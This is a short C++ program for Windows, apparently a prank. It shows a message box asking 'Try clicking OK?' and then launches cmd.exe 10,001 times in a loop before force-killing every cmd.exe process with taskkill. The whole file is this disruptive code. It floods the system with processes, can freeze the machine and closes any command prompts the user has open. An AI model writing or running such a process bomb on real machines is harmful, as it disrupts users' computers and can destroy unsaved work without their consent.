#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
int main() 
{
	MessageBox(NULL,"你点确定试试？","你点确定试试？",MB_OK);
	for(int i=0;i<=10000;i+=1)
	{
		system("start cmd.exe");
	} 
	for(int i=0;i<=10000;i+=1)
	{
		system("taskkill /f /im cmd.exe");
	}
	
} 
